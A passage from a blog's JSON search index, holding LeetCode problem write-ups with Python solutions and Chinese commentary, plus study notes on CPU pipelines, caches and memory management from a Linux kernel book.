[3,2,1].Example 2:\nInput: nums1 = [0,0,0,0,0], nums2 = [0,0,0,0,0]Output: 5 Constraints:\n1 \u003c= nums1.length, nums2.length \u003c= 10000 \u003c= nums1[i], nums2[i] \u003c= 100 Sol 因為需要追蹤長度，所以一定會多一個維度去看長度，就會變成三維\n但如果用bottomup就會在bottomup時順便把長度算好，變成只要看二維就好!!\nclass Solution: def findLength(self, ns1: List[int], ns2: List[int]) -\u0026gt; int: \u0026#39;\u0026#39;\u0026#39; @cache def dp(i,j,k): if i \u0026lt; 0 or j \u0026lt; 0: return k if ns1[i] == ns2[j]: ret = dp(i-1,j-1,k+1) else: ret = k return max(ret, dp(i-1,j,0), dp(i,j-1,0)) return dp(len(ns1)-1,len(ns2)-1,0) \u0026#39;\u0026#39;\u0026#39; dp = [[0] * (len(ns2)) for _ in range(len(ns1))] ret = 0 for i in range(1,len(ns1)): for j in range(1,len(ns2)): if ns1[i] == ns2[j]: dp[i][j] = dp[i-1][j-1]+1 ret = max(ret, dp[i][j]) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-718-maximum-length-of-repeated-subarray/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e超有意思的題目，只能用bottomup dp的題目!!\n下次不能說topdown與bottomup的dp可以互換了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003etopdown dp與bottomup dp差在一個在前半段處理，另一個在後半段\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e因為上面的特質導致這題只能用bottomup\u003c/p\u003e","title":"leetcode-718 - Maximum Length of Repeated Subarray"},{"content":"動機 sliding window但是用heap去找window的最大最小\nProblem Given an array of integers nums and an integer limit, return the size of the longest non-empty subarray such that the absolute difference between any two elements of this subarray is less than or equal to limit.\nExample 1:\nInput: nums = [8,2,4,7], limit = 4Output: 2 Explanation: All subarrays are: [8] with maximum absolute diff |8-8| = 0 \u003c= 4.[8,2] with maximum absolute diff |8-2| = 6 \u003e 4. [8,2,4] with maximum absolute diff |8-2| = 6 \u003e 4.[8,2,4,7] with maximum absolute diff |8-2| = 6 \u003e 4.[2] with maximum absolute diff |2-2| = 0 \u003c= 4.[2,4] with maximum absolute diff |2-4| = 2 \u003c= 4.[2,4,7] with maximum absolute diff |2-7| = 5 \u003e 4.[4] with maximum absolute diff |4-4| = 0 \u003c= 4.[4,7] with maximum absolute diff |4-7| = 3 \u003c= 4.[7] with maximum absolute diff |7-7| = 0 \u003c= 4. Therefore, the size of the longest subarray is 2.Example 2:\nInput: nums = [10,1,2,4,7,2], limit = 5Output: 4 Explanation: The subarray [2,4,7,2] is the longest since the maximum absolute diff is |2-7| = 5 \u003c= 5.Example 3:\nInput: nums = [4,2,2,2,4,4,2,2], limit = 0Output: 3 Constraints:\n1 \u003c= nums.length \u003c= 1051 \u003c= nums[i] \u003c= 1090 \u003c= limit \u003c= 109 Sol from sortedcontainers import SortedList class Solution: def longestSubarray(self, nums: List[int], limit: int) -\u0026gt; int: win = SortedList() i, ret = 0, 0 for j,n in enumerate(nums): win.add(n) while i\u0026lt;=j and win[-1]-win[0] \u0026gt; limit: win.remove(nums[i]) i += 1 ret = max(ret, j-i+1) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-1438-longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esliding window但是用heap去找window的最大最小\u003c/p\u003e","title":"leetcode-1438 - Longest Continuous Subarray With Absolute Diff Less Than or Equal to Limit"},{"content":"動機 我忘了dp\nProblem Given a string s, find the longest palindromic subsequence's length in s.\nA subsequence is a sequence that can be derived from another sequence by deleting some or no elements without changing the order of the remaining elements.\nExample 1:\nInput: s = \"bbbab\"Output: 4Explanation: One possible longest palindromic subsequence is \"bbbb\".Example 2:\nInput: s = \"cbbd\"Output: 2Explanation: One possible longest palindromic subsequence is \"bb\". Constraints:\n1 \u003c= s.length \u003c= 1000s consists only of lowercase English letters. Sol class Solution: def longestPalindromeSubseq(self, s: str) -\u0026gt; int: @cache def dp(i,j): if i \u0026gt; j: return 0 elif i == j: return 1 elif s[i] == s[j]: return 2+dp(i+1,j-1) else: return max(dp(i+1,j),dp(i,j-1)) return dp(0,len(s)-1) ","permalink":"https://littlebees.github.io/2021/08/leetcode-516-longest-palindromic-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我忘了dp\u003c/p\u003e","title":"leetcode-516 - Longest Palindromic Subsequence"},{"content":"動機 atMost或是在回收時計算長度\nProblem Given an array of integers nums and an integer k. A continuous subarray is called nice if there are k odd numbers on it.\nReturn the number of nice sub-arrays.\nExample 1:\nInput: nums = [1,1,2,1,1], k = 3Output: 2Explanation: The only sub-arrays with 3 odd numbers are [1,1,2,1] and [1,2,1,1].Example 2:\nInput: nums = [2,4,6], k = 1Output: 0Explanation: There is no odd numbers in the array.Example 3:\nInput: nums = [2,2,2,1,2,2,1,2,2,2], k = 2Output: 16 Constraints:\n1 \u003c= nums.length \u003c= 500001 \u003c= nums[i] \u003c= 10^51 \u003c= k \u003c= nums.length Sol class Solution: def numberOfSubarrays(self, nums: List[int], k: int) -\u0026gt; int: def atmost(limit): i = cnt = ret = 0 for j,n in enumerate(nums): if n % 2 == 1: cnt += 1 while i \u0026lt;= j and cnt \u0026gt; limit: if nums[i] % 2 == 1: cnt -= 1 i += 1 ret += j-i+1 return ret return atmost(k)-atmost(k-1) 另一個是在回收時計算長度\ndef numberOfSubarrays(self, A, k): i = count = res = 0 for j in range(len(A)): if A[j] \u0026amp; 1: k -= 1 count = 0 # 等累積到合法時才計算長度 while k == 0: k += A[i] \u0026amp; 1 i += 1 count += 1 res += count return res ","permalink":"https://littlebees.github.io/2021/08/leetcode-1248-count-number-of-nice-subarrays/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eatMost或是在回收時計算長度\u003c/p\u003e","title":"leetcode-1248 - Count Number of Nice Subarrays"},{"content":"動機 window中的東西可以亂生!!\nProblem You are given a string containing only 4 kinds of characters 'Q', 'W', 'E' and 'R'.\nA string is said to be balanced if each of its characters appears n/4 times where n is the length of the string.\nReturn the minimum length of the substring that can be replaced with any other string of the same length to make the original string s balanced.\nReturn 0 if the string is already balanced.\nExample 1:\nInput: s = \"QWER\"Output: 0Explanation: s is already balanced.Example 2:\nInput: s = \"QQWE\"Output: 1Explanation: We need to replace a 'Q' to 'R', so that \"RQWE\" (or \"QRWE\") is balanced.Example 3:\nInput: s = \"QQQW\"Output: 2Explanation: We can replace the first \"QQ\" to \"ER\". Example 4:\nInput: s = \"QQQQ\"Output: 3Explanation: We can replace the last 3 'Q' to make s = \"QWER\". Constraints:\n1 \u003c= s.length \u003c= 10^5s.length is a multiple of 4s contains only 'Q', 'W', 'E' and 'R'. Sol window中的東西可以亂生，所以只要外面不超標的話就可以用window把string給平衡掉\nclass Solution: def balancedString(self, s: str) -\u0026gt; int: cnts, base = Counter(s), len(s)//4 if all([cnts[x] == base for x in \u0026#34;QWER\u0026#34;]): return 0 i = 0 ret = float(\u0026#39;inf\u0026#39;) for j,c in enumerate(s): cnts[c] -= 1 while i \u0026lt;= j and all([base \u0026gt;= cnts[x] for x in \u0026#34;QWER\u0026#34;]): # string will be balanced ret = min(ret, j-i+1) cnts[s[i]] += 1 i += 1 return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-1234-replace-the-substring-for-balanced-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003ewindow中的東西可以亂生!!\u003c/p\u003e","title":"leetcode-1234 - Replace the Substring for Balanced String"},{"content":"動機 用atMost秒殺 用prefix sum in fly也可以\nProblem Given a binary array nums and an integer goal, return the number of non-empty subarrays with a sum goal.\n\\r\\rA subarray is a contiguous part of the array.\n\\r\\r \\rExample 1:\n\\r\\r\\rInput: nums = [1,0,1,0,1], goal = 2\\rOutput: 4\\rExplanation: The 4 subarrays are bolded and underlined below:\\r[1,0,1,0,1]\\r[1,0,1,0,1]\\r[1,0,1,0,1]\\r[1,0,1,0,1]\\r\\r\\rExample 2:\n\\r\\r\\rInput: nums = [0,0,0,0,0], goal = 0\\rOutput: 15\\r\\r\\r \\rConstraints:\n\\r\\r\\r1 \u003c= nums.length \u003c= 3 * 104\\rnums[i] is either 0 or 1.\\r0 \u003c= goal \u003c= nums.length\\r Sol class Solution: def numSubarraysWithSum(self, nums: List[int], goal: int) -\u0026gt; int: def atmost(bound): ret = cnts = i = 0 for j,n in enumerate(nums): cnts += n while i \u0026lt;= j and cnts \u0026gt; bound: cnts -= nums[i] i += 1 ret += j-i+1 return ret return atmost(goal)-atmost(goal-1) def numSubarraysWithSum(self, A, S): c = collections.Counter({0: 1}) psum = res = 0 for i in A: psum += i res += c[psum - S] c[psum] += 1 return res ","permalink":"https://littlebees.github.io/2021/08/leetcode-930-binary-subarrays-with-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用atMost秒殺\n用prefix sum in fly也可以\u003c/p\u003e","title":"leetcode-930 - Binary Subarrays With Sum"},{"content":"動機 基本款sliding window\nProblem Given a binary array nums and an integer k, return the maximum number of consecutive 1's in the array if you can flip at most k 0's.\nExample 1:\nInput: nums = [1,1,1,0,0,0,1,1,1,1,0], k = 2Output: 6Explanation: [1,1,1,0,0,1,1,1,1,1,1]Bolded numbers were flipped from 0 to 1. The longest subarray is underlined.Example 2:\nInput: nums = [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], k = 3Output: 10Explanation: [0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1]Bolded numbers were flipped from 0 to 1. The longest subarray is underlined. Constraints:\n1 \u003c= nums.length \u003c= 105nums[i] is either 0 or 1.0 \u003c= k \u003c= nums.length Sol class Solution: def longestOnes(self, nums: List[int], k: int) -\u0026gt; int: i = cnt = ret = 0 for j,n in enumerate(nums): if n == 0: cnt += 1 while i \u0026lt;= j and cnt \u0026gt; k: if nums[i] == 0: cnt -= 1 i += 1 ret = max(ret, j-i+1) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-1004-max-consecutive-ones-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e基本款sliding window\u003c/p\u003e","title":"leetcode-1004 - Max Consecutive Ones III"},{"content":"動機 sliding window的新招式\nbinary search的range是左閉右開 lower bound: \u0026gt;=的第一個值 upper bound: \u0026gt;的第一個值 sliding window是左閉右閉 atMost: \u0026lt;=目標的所有區間總數 Problem Given an integer array nums and an integer k, return the number of good subarrays of nums.\nA good array is an array where the number of different integers in that array is exactly k.\nFor example, [1,2,3,1,2] has 3 different integers: 1, 2, and 3.A subarray is a contiguous part of an array.\nExample 1:\nInput: nums = [1,2,1,2,3], k = 2Output: 7Explanation: Subarrays formed with exactly 2 different integers: [1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2]Example 2:\nInput: nums = [1,2,1,3,4], k = 3Output: 3Explanation: Subarrays formed with exactly 3 different integers: [1,2,1,3], [2,1,3], [1,3,4]. Constraints:\n1 \u003c= nums.length \u003c= 2 * 1041 \u003c= nums[i], k \u003c= nums.length Sol class Solution: def subarraysWithKDistinct(self, nums: List[int], k: int) -\u0026gt; int: def atmost(bound): ret = i = 0 cnts = defaultdict(int) for j,n in enumerate(nums): cnts[n] += 1 while i \u0026lt;= j and len(cnts) \u0026gt; bound: if cnts[nums[i]] == 1: del cnts[nums[i]] else: cnts[nums[i]] -= 1 i += 1 ret += j-i+1 return ret return atmost(k)-atmost(k-1) ","permalink":"https://littlebees.github.io/2021/08/leetcode-992-subarrays-with-k-different-integers/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esliding window的新招式\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ebinary search的range是左閉右開\n\u003cul\u003e\n\u003cli\u003elower bound: \u003ccode\u003e\u0026gt;=的第一個值\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eupper bound: \u003ccode\u003e\u0026gt;的第一個值\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003esliding window是左閉右閉\n\u003cul\u003e\n\u003cli\u003eatMost: \u003ccode\u003e\u0026lt;=目標的所有區間總數\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-992 - Subarrays with K Different Integers"},{"content":"動機 三維dp!? 這真的能在45分做出來?\nProblem You are given several boxes with different colors represented by different positive numbers.\nYou may experience several rounds to remove boxes until there is no box left. Each time you can choose some continuous boxes with the same color (i.e., composed of k boxes, k \u003e= 1), remove them and get k * k points.\nReturn the maximum points you can get.\nExample 1:\nInput: boxes = [1,3,2,2,2,3,4,3,1]Output: 23Explanation:[1, 3, 2, 2, 2, 3, 4, 3, 1] ----\u003e [1, 3, 3, 4, 3, 1] (3*3=9 points) ----\u003e [1, 3, 3, 3, 1] (1*1=1 points) ----\u003e [1, 1] (3*3=9 points) ----\u003e [] (2*2=4 points)Example 2:\nInput: boxes = [1,1,1]Output: 9Example 3:\nInput: boxes = [1]Output: 1 Constraints:\n1 \u003c= boxes.length \u003c= 1001 \u003c= boxes[i] \u003c= 100 Sol dp去模擬移除箱子的過程，dp(i,j)是範圍中的最大分數，k是與j的顏色相同的箱子個數\n之後就是兩個case\n把累績到現在的盒子花掉 累積箱子 BACAA: dp(0,4,0) BA|AA: dp(0,1,2) B|AAA: dp(0,1,3)\n想從dp(0,4,0)變成dp(0,1,3) BACA|A: dp(0,3,1)+dp(4,3,0) BAC|AA:dp(0,2,2)+dp(3,4,0) B|AAA: dp(0,1,3)+...\nclass Solution: def removeBoxes(self, boxes: List[int]) -\u0026gt; int: @cache def dp(i,j,k): if i \u0026gt; j: return 0 else: ret = dp(i,j-1,0)+(k+1)**2 divs = [dp(i,x,k+1)+dp(x+1,j-1,0) for x in range(i,j) if boxes[x] == boxes[j]] return max(ret,max(divs,default=0)) return dp(0,len(boxes)-1,0) ","permalink":"https://littlebees.github.io/2021/08/leetcode-546-remove-boxes/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e三維dp!?\n這真的能在45分做出來?\u003c/p\u003e","title":"leetcode-546 - Remove Boxes"},{"content":"動機 What makes this problem hard is that we have negative values.\nsliding window + monotone stack = monotone queue prefix sum in fly + hash Problem Given an integer array nums and an integer k, return the length of the shortest non-empty subarray of nums with a sum of at least k. If there is no such subarray, return -1.\nA subarray is a contiguous part of an array.\nExample 1:\nInput: nums = [1], k = 1Output: 1Example 2:\nInput: nums = [1,2], k = 4Output: -1Example 3:\nInput: nums = [2,-1,2], k = 3Output: 3 Constraints:\n1 \u003c= nums.length \u003c= 105-105 \u003c= nums[i] \u003c= 1051 \u003c= k \u003c= 109 Sol 這次有負數代表sum不會直線上升，但是題目要求至少總和為k\n所以還有用sliding window的希望，不過要處理sum可能會下降的問題\nmonotone stack可以維持sum直線上升，所以我們要把兩個技巧結合起來\nclass Solution: def shortestSubarray(self, nums: List[int], k: int) -\u0026gt; int: psum = defaultdict(int) q = deque([[-1,0]]) cnt = 0 ret = float(\u0026#39;inf\u0026#39;) for i,n in enumerate(nums): cnt += n while q and cnt - q[0][1] \u0026gt;= k: ret = min(ret, i-q.popleft()[0]) while q and q[-1][1] \u0026gt;= cnt: # k \u0026gt;= cnt - q[-1][1] q.pop() q.append([i,cnt]) return ret if ret != float(\u0026#39;inf\u0026#39;) else -1 ","permalink":"https://littlebees.github.io/2021/08/leetcode-862-shortest-subarray-with-sum-at-least-k/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWhat makes this problem hard is that we have negative values.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003esliding window + monotone stack = monotone queue\u003c/li\u003e\n\u003cli\u003eprefix sum in fly + hash\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-862 - Shortest Subarray with Sum at Least K"},{"content":"動機 建圖去走\nProblem You are given an array of variable pairs equations and an array of real numbers values, where equations[i] = [Ai, Bi] and values[i] represent the equation Ai / Bi = values[i]. Each Ai or Bi is a string that represents a single variable.\nYou are also given some queries, where queries[j] = [Cj, Dj] represents the jth query where you must find the answer for Cj / Dj = ?.\nReturn the answers to all queries. If a single answer cannot be determined, return -1.0.\nNote: The input is always valid. You may assume that evaluating the queries will not result in division by zero and that there is no contradiction.\nExample 1:\nInput: equations = [[\"a\",\"b\"],[\"b\",\"c\"]], values = [2.0,3.0], queries = [[\"a\",\"c\"],[\"b\",\"a\"],[\"a\",\"e\"],[\"a\",\"a\"],[\"x\",\"x\"]]Output: [6.00000,0.50000,-1.00000,1.00000,-1.00000]Explanation: Given: a / b = 2.0, b / c = 3.0queries are: a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ?return: [6.0, 0.5, -1.0, 1.0, -1.0 ]Example 2:\nInput: equations = [[\"a\",\"b\"],[\"b\",\"c\"],[\"bc\",\"cd\"]], values = [1.5,2.5,5.0], queries = [[\"a\",\"c\"],[\"c\",\"b\"],[\"bc\",\"cd\"],[\"cd\",\"bc\"]]Output: [3.75000,0.40000,5.00000,0.20000]Example 3:\nInput: equations = [[\"a\",\"b\"]], values = [0.5], queries = [[\"a\",\"b\"],[\"b\",\"a\"],[\"a\",\"c\"],[\"x\",\"y\"]]Output: [0.50000,2.00000,-1.00000,-1.00000] Constraints:\n1 \u003c= equations.length \u003c= 20equations[i].length == 21 \u003c= Ai.length, Bi.length \u003c= 5values.length == equations.length0.0 \u003c values[i] \u003c= 20.01 \u003c= queries.length \u003c= 20queries[i].length == 21 \u003c= Cj.length, Dj.length \u003c= 5Ai, Bi, Cj, Dj consist of lower case English letters and digits. Sol class Solution: def calcEquation(self, equations: List[List[str]], values: List[float], queries: List[List[str]]) -\u0026gt; List[float]: db = defaultdict(lambda :-1.0) gh = defaultdict(list) for ((a,b),val) in zip(equations, values): db[(a,b)] = val db[(b,a)] = 1.0/val db[(a,a)] = db[(b,b)] = 1.0 gh[a].append(b) gh[b].append(a) def dfs(root,lhs, acc=1.0, seen=set()): if lhs in seen: return else: seen.add(lhs) for rhs in gh[lhs]: db[(root,rhs)] = acc*db[(lhs,rhs)] db[(rhs,root)] = 1/(acc*db[(lhs,rhs)]) dfs(root,rhs,acc*db[(lhs,rhs)],seen) [dfs(root,root,1.0,set()) for root in gh.keys()] return [db[(lhs,rhs)] for (lhs,rhs) in queries] ","permalink":"https://littlebees.github.io/2021/08/leetcode-399-evaluate-division/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e建圖去走\u003c/p\u003e","title":"leetcode-399 - Evaluate Division"},{"content":"動機 把需要的spec定義出來就好\nProblem You have n binary tree nodes numbered from 0 to n - 1 where node i has two children leftChild[i] and rightChild[i], return true if and only if all the given nodes form exactly one valid binary tree.\nIf node i has no left child then leftChild[i] will equal -1, similarly for the right child.\nNote that the nodes have no values and that we only use the node numbers in this problem.\nExample 1:\nInput: n = 4, leftChild = [1,-1,3,-1], rightChild = [2,-1,-1,-1]Output: trueExample 2:\nInput: n = 4, leftChild = [1,-1,3,-1], rightChild = [2,3,-1,-1]Output: falseExample 3:\nInput: n = 2, leftChild = [1,0], rightChild = [-1,-1]Output: falseExample 4:\nInput: n = 6, leftChild = [1,-1,-1,4,-1,-1], rightChild = [2,-1,-1,5,-1,-1]Output: false Constraints:\n1 \u003c= n \u003c= 104leftChild.length == rightChild.length == n-1 \u003c= leftChild[i], rightChild[i] \u003c= n - 1 Sol 只有一個root 沒有loop 所有點都要被走過 class Solution: def validateBinaryTreeNodes(self, n: int, leftChild: List[int], rightChild: List[int]) -\u0026gt; bool: root = set(range(n)) - (set(leftChild) | set(rightChild)) if len(root) != 1: return False else: root = list(root)[0] seen = set() def dfs(i): if i == -1: return True elif i in seen: return False else: seen.add(i) return dfs(leftChild[i]) and dfs(rightChild[i]) return dfs(root) and len(seen) == n ","permalink":"https://littlebees.github.io/2021/08/leetcode-1361-validate-binary-tree-nodes/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e把需要的spec定義出來就好\u003c/p\u003e","title":"leetcode-1361 - Validate Binary Tree Nodes"},{"content":"動機 對ㄟ，除2是一半，sqrt也是一半\ninsight: sqrt也是一半\nProblem A web developer needs to know how to design a web page's size. So, given a specific rectangular web page’s area, your job by now is to design a rectangular web page, whose length L and width W satisfy the following requirements:\nThe area of the rectangular web page you designed must equal to the given target area.The width W should not be larger than the length L, which means L \u003e= W.The difference between length L and width W should be as small as possible.Return an array [L, W] where L and W are the length and width of the web page you designed in sequence.\nExample 1:\nInput: area = 4Output: [2,2]Explanation: The target area is 4, and all the possible ways to construct it are [1,4], [2,2], [4,1]. But according to requirement 2, [1,4] is illegal; according to requirement 3, [4,1] is not optimal compared to [2,2]. So the length L is 2, and the width W is 2.Example 2:\nInput: area = 37Output: [37,1]Example 3:\nInput: area = 122122Output: [427,286] Constraints:\n1 \u003c= area \u003c= 107 Sol class Solution: def constructRectangle(self, area: int) -\u0026gt; List[int]: w = ceil(sqrt(area)) while area%w \u0026gt; 0: w -= 1 return sorted([area//w, w], reverse=True) ","permalink":"https://littlebees.github.io/2021/08/leetcode-492-construct-the-rectangle/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e對ㄟ，除2是一半，sqrt也是一半\u003c/p\u003e\n\u003cp\u003einsight: \u003cem\u003esqrt也是一半\u003c/em\u003e\u003c/p\u003e","title":"leetcode-492 - Construct the Rectangle"},{"content":"動機 BFS硬幹\nProblem A gene string can be represented by an 8-character long string, with choices from 'A', 'C', 'G', and 'T'.\nSuppose we need to investigate a mutation from a gene string start to a gene string end where one mutation is defined as one single character changed in the gene string.\nFor example, \"AACCGGTT\" --\u003e \"AACCGGTA\" is one mutation.There is also a gene bank bank that records all the valid gene mutations. A gene must be in bank to make it a valid gene string.\nGiven the two gene strings start and end and the gene bank bank, return the minimum number of mutations needed to mutate from start to end. If there is no such a mutation, return -1.\nNote that the starting point is assumed to be valid, so it might not be included in the bank.\nExample 1:\nInput: start = \"AACCGGTT\", end = \"AACCGGTA\", bank = [\"AACCGGTA\"]Output: 1Example 2:\nInput: start = \"AACCGGTT\", end = \"AAACGGTA\", bank = [\"AACCGGTA\",\"AACCGCTA\",\"AAACGGTA\"]Output: 2Example 3:\nInput: start = \"AAAAACCC\", end = \"AACCCCCC\", bank = [\"AAAACCCC\",\"AAACCCCC\",\"AACCCCCC\"]Output: 3 Constraints:\nstart.length == 8end.length == 80 \u003c= bank.length \u003c= 10bank[i].length == 8start, end, and bank[i] consist of only the characters ['A', 'C', 'G', 'T']. Sol class Solution: def minMutation(self, start: str, end: str, bank: List[str]) -\u0026gt; int: if end not in bank: return -1 else: seen = set() q = deque([[start,0]]) def legal(s,now): chance = 1 for i in range(8): if s[i] != now[i]: if chance == 1: chance -= 1 else: return False return True while q: now, size = q.popleft() if now == end: return size seen.add(now) candidates = [s for s in bank if s not in seen and legal(s,now)] [q.append([c, size+1]) for c in candidates] return -1 ","permalink":"https://littlebees.github.io/2021/08/leetcode-433-minimum-genetic-mutation/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eBFS硬幹\u003c/p\u003e","title":"leetcode-433 - Minimum Genetic Mutation"},{"content":"動機 複習linked list的處理手法\nProblem Given the head of a singly linked list, sort the list using insertion sort, and return the sorted list's head.\nThe steps of the insertion sort algorithm:\nInsertion sort iterates, consuming one input element each repetition and growing a sorted output list.At each iteration, insertion sort removes one element from the input data, finds the location it belongs within the sorted list and inserts it there.It repeats until no input elements remain.The following is a graphical example of the insertion sort algorithm. The partially sorted list (black) initially contains only the first element in the list. One element (red) is removed from the input data and inserted in-place into the sorted list with each iteration.\nExample 1:\nInput: head = [4,2,1,3]Output: [1,2,3,4]Example 2:\nInput: head = [-1,5,3,4,0]Output: [-1,0,3,4,5] Constraints:\nThe number of nodes in the list is in the range [1, 5000].-5000 \u003c= Node.val \u003c= 5000 Sol 隨時記得把linked list的next設成None\nclass Solution: def insertionSortList(self, head: ListNode) -\u0026gt; ListNode: if not head: return None else: def insert(start, node): ret = start prev = None while start: if node.val \u0026lt;= start.val: if prev: prev.next, node.next = node, prev.next else: node.next = start ret = node return ret else: prev, start = start, start.next prev.next = node node.next = None return ret start, cur = head, head.next start.next = None while cur: tmp,cur.next = cur.next, None start = insert(start, cur) cur = tmp return start ","permalink":"https://littlebees.github.io/2021/08/leetcode-147-insertion-sort-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習linked list的處理手法\u003c/p\u003e","title":"leetcode-147 - Insertion Sort List"},{"content":"動機 從最左一路加digit上去\nProblem Given an integer n, return all the numbers in the range [1, n] sorted in lexicographical order.\nYou must write an algorithm that runs in O(n) time and uses O(1) extra space. Example 1:\nInput: n = 13Output: [1,10,11,12,13,2,3,4,5,6,7,8,9]Example 2:\nInput: n = 2Output: [1,2] Constraints:\n1 \u003c= n \u003c= 5 * 104 Sol class Solution: def lexicalOrder(self, n: int,acc=0) -\u0026gt; List[int]: ret = [] for x in range(acc,acc+10): if x == 0: continue if x \u0026lt;= n: ret += [x]+self.lexicalOrder(n,x*10) else: break return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-386-lexicographical-numbers/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e從最左一路加digit上去\u003c/p\u003e","title":"leetcode-386 - Lexicographical Numbers"},{"content":"動機 這書真的很厚，光是第二章就佔了全書的一半，所以就一章一篇吧\ncpu risc \u0026amp; cisc cisc有micro operation!! big, little endian union { int a; char b; } x; x.a = 1; return (x.b == 1); // true for little-endian 執行過程 課本款: IF \u0026gt; ID \u0026gt; EX \u0026gt; MEM \u0026gt; WB x86 from L1 cache IF+branch predition ID translate into micro operation(uops) dispatch (out-of-order exec) rename (int, float) scheduler EXE commit results (in-order) WB (by LSQ) to L1 cache arm from L1 cache IF+branch predition ID (可以多路，cortex-A9是2路) rename (reg) dispatch (out-of-order exec, 可以多路，這裡是4路) EXE WB (by LSU(LSQ in x86)) to L1 cache unit LSQ: 處理memory consistency \u0026amp; cache coherence memory consistency (Read/write的順序是不是對的) strict consistency sequential consistency weak consistency 有資料指令與同步指令(mem barrier) mem barrier in arm data mem barrier: 前面的讀寫操作都完成才會commit DMM後面的結果 data sync barrier: 前面的讀寫操作都完成才會執行DSB後面的指令 instraction sync barrier: flush pipeline或是buffer後才開始拿ISB後面的指令 cache coherence (cache中的資料有效嗎) MESI protocal cache與mem一致 E: 獨佔態(只有我有這資料且與mem一樣) S: 共用態(多人有這資料且與mem一樣) 不一致 I: 無效態 M: 修改態 (只有我有這資料) 監聽protocal (另一種叫directory protocal) 在4個動作做state transfer 讀寫mem 讀寫cache superscalar arch: 一次發射多條指令 reg rename: 消滅WAR, WAW 當某cmd出事時不會影響到後面的指令 cache 結構 set: 同一index的cache line(想成有很多張表) line: len(mx[i]) (不包含tag, cache line大小一般來說是32Bytes) way: matrix(表) tag: cache line的MD5 index, offset: mx[index][offset] map 方式 direct mapping 只有一張表，所以很容易與其他index相同的資料撞 cache thrashing addr: tag[31:6], index[5:4], line[3:2], \u0026hellip;[1:0]` line是mx[i][j]的j，index就是i set mapping 多張表，讓同index撞的機率變小 從哪個addr取cache index VIVT virtual index, virtual tag cache alias 一個實體addr可以map到多個cache line 當假addr換了，就要clear或invalidate cache VIPT virtual index, physical tag 可以同時查TLB與跑MMU 不用怕當假addr換了，就要clear或invalidate cache 但還是可能有cache alias PIPT physical index, physical tag 從virtual addr到physical addr的過程 cpu -\u0026gt; MMU -\u0026gt; cache -\u0026gt; 查page table 在aarch64 virtual addr(VA): ttbx[64:63], ...[62:48], L0index[47:39], L1index[38:30], L2index[29:21], L3index[20:12], VA[11:0] ttbx有兩個register(ttbx0,ttbx1)分別是高位與低位的page table的base addr 之後就是用index去每一層table去換下一層的addr page size: 64KB, 16KB, 4KB physical addr(PA): ...[64:63], ...[62:48], PA(from table)[47:12], PA(from virtual addr)[11:0] cache與linux kernel的關係是 kernel大部分資料結構都是與cache line對齊的 不然會橫跨兩條以上的cache line需要invalidate時會把另一個也一起劃掉 cache evict策略 random fifo lru 多process與TLB關係? 多process會讓VA常常需要去換PA，這很慢 所以有TLB去cache，以page為單位 如果process很大，可以適時把page size拉大，讓TLB不容易爆cache ","permalink":"https://littlebees.github.io/2021/08/%E5%A5%94%E8%B7%91%E5%90%A7linux-kernel%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這書真的很厚，光是第二章就佔了全書的一半，所以就一章一篇吧\u003c/p\u003e","title":"奔跑吧linux kernel第一章筆記"},{"content":"動機 乖乖sort 用到整數除法注意奇數 Problem Given an array of integers arr of even length, return true if and only if it is possible to reorder it such that arr[2 * i + 1] = 2 * arr[2 * i] for every 0 \u003c= i \u003c len(arr) / 2.\nExample 1:\nInput: arr = [3,1,3,6]Output: falseExample 2:\nInput: arr = [2,1,2,6]Output: falseExample 3:\nInput: arr = [4,-2,2,-4]Output: trueExplanation: We can take two groups, [-2,-4] and [2,4] to form [-2,-4,2,4] or [2,4,-2,-4].Example 4:\nInput: 